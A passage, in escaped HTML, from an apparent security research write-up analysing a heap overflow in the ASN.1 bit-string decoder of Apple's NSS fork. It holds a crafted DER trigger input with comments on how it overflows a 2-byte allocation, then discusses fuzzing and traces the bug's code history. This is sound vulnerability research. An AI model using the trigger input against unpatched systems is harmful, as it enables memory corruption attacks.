class="c11"&gt;0x4a&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// initial allocation size&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ASN1_CLASS_UNIVERSAL &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ASN1_PRIMITIVE &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ASN1_BIT_STRING&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0x1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// force item-&amp;gt;Data = NULL&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0x0&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// number of unused bits in the final byte&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ASN1_CLASS_UNIVERSAL &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ASN1_PRIMITIVE &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ASN1_BIT_STRING&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0x2&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// this is the reallocation size&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0x0&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// number of unused bits in the final byte&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0xff&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// only byte of bitstring&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ASN1_CLASS_UNIVERSAL &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ASN1_PRIMITIVE &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ASN1_BIT_STRING&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0x41&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// 64 actual bytes, plus the remainder, will cause 0x40 byte memcpy one byte in to 2 byte allocation&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0x0&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// number of unused bits in the final byte&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0xff&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0xff&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c23"&gt;// -- continues for overflow&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class="c8 c15 c32" id="h.vxzzlpbs8x7"&gt;&lt;span class="c31 c28"&gt;Why wasn&amp;#39;t this found by fuzzing?&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;This is a reasonable question to ask. This source code is really really hard to audit, even with the diff it was at least a week of work to figure out the true root cause of the bug. I&amp;#39;m not sure if I would have spotted this issue during a code audit. It&amp;#39;s very broken but it&amp;#39;s quite subtle and you have to figure out a &lt;/span&gt;&lt;span class="c17"&gt;lot&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;about the state machine and the bounds-checking rules to see it - I think I might have given up before I figured it out and gone to look for something easier.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;But the trigger test-case is neither structurally complex nor large, and feels within-grasp for a fuzzer. So why wasn&amp;#39;t it found? I&amp;#39;ll offer two points for discussion:&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c8 c15 c33" id="h.3uiruiqbxcn4"&gt;&lt;span class="c10"&gt;Perhaps it&amp;#39;s not being fuzzed?&lt;/span&gt;&lt;/h3&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Or at least, it&amp;#39;s not being fuzzed in the exact form which it appears in Apple&amp;#39;s Security.framework library. I understand that both Mozilla and Google do fuzz the NSS ASN.1 parser and have found a bunch of vulnerabilities, but note that the key part of the vulnerable code (&amp;quot;&lt;/span&gt;&lt;span class="c30"&gt;|| (state-&amp;gt;contents_length == 1&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c30"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class="c9"&gt;) isn&amp;#39;t present in upstream NSS (more on that below.)&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c33 c8 c15" id="h.d8eztr5gmfv7"&gt;&lt;span class="c10"&gt;Can it be fuzzed effectively?&lt;/span&gt;&lt;/h3&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Even if you did build the Security.framework version of the code and used a coverage guided fuzzer, you might well not trigger any crashes. The code uses a custom heap allocator and you&amp;#39;d have to either replace that with direct calls to the system allocator or use ASAN&amp;#39;s custom allocator hooks. Note that &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://searchfox.org/mozilla-central/source/nsprpub/lib/ds/plarena.h#128"&gt;upstream NSS does do that&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but as I &lt;/span&gt;&lt;span&gt;understand&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;it, Apple&amp;#39;s fork doesn&amp;#39;t.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c32 c8 c15" id="h.k3orbgexvo70"&gt;&lt;span class="c31 c28"&gt;History&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;I&amp;#39;m always interested in not just understanding how a vulnerability works but how it was introduced. This case is a particularly compelling example because once you understand the bug, the code construct initially looks extremely suspicious. It &lt;/span&gt;&lt;span class="c17"&gt;only&lt;/span&gt;&lt;span&gt;&amp;nbsp;exists in Apple&amp;#39;s fork of NSS and the only impact of that change is to introduce a perfect memory corruption primitive. But let&amp;#39;s go through the history of the code to convince ourselves that it is &lt;/span&gt;&lt;span&gt;much more likely that it was just an unfortunate accident:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The earliest reference to this code I can find is &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/blob/5dea64f5a5bc55978a9f4632a5f59679572c7985/security/nss/lib/util/secasn1d.c"&gt;this, which appears to be the initial checkin in the Mozilla CVS repo on March 31, 2000&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.fa2500551086942ee26203176218d93c890969af"&gt;&lt;/a&gt;&lt;a id="t.16"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;static&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;sec_asn1d_parse_bit_string &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;const&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;buf&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;len &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;status &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;needBytes&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;buf&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;7&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_SetError &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;SEC_ERROR_BAD_DER&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;status &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;decodeError&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;bit_string_unused_bits &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;duringBitString&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;-=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;On August 24th, 2001 the form of the code changed to something like the current version, &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656"&gt;in &lt;/a&gt;&lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656"&gt;this commit&lt;/a&gt;&lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656"&gt;&amp;nbsp;with the message &amp;quot;Memory leak fixes.&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.0b11f6358ac77c720b0e948095a2bc43c83ffaf3"&gt;&lt;/a&gt;&lt;a id="t.17"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;static&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;sec_asn1d_parse_bit_string &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;const&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;buf&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c12"&gt;-&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;state&lt;/span&gt;&lt;span class="c1 c12"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;pending &lt;/span&gt;&lt;span class="c1 c12"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;0&lt;/span&gt;&lt;span class="c1 c12"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/*PORT_Assert (state-&amp;gt;pending &amp;gt; 0); */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="c16 c4"&gt;if&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;(&lt;/span&gt;&lt;span class="c3 c4"&gt;state&lt;/span&gt;&lt;span class="c1 c4"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c4"&gt;pending &lt;/span&gt;&lt;span class="c1 c4"&gt;==&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c4"&gt;0&lt;/span&gt;&lt;span class="c1 c4"&gt;)&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c4"&gt;if&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;(&lt;/span&gt;&lt;span class="c3 c4"&gt;state&lt;/span&gt;&lt;span class="c1 c4"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c4"&gt;dest &lt;/span&gt;&lt;span class="c1 c4"&gt;!=&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1 c4"&gt;)&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c20 c4"&gt;SECItem&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;*&lt;/span&gt;&lt;span class="c3 c4"&gt;item &lt;/span&gt;&lt;span class="c1 c4"&gt;=&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;(&lt;/span&gt;&lt;span class="c20 c4"&gt;SECItem&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c4"&gt;*)(&lt;/span&gt;&lt;span class="c3 c4"&gt;state&lt;/span&gt;&lt;span class="c1 c4"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c4"&gt;dest&lt;/span&gt;&lt;span class="c1 c4"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1 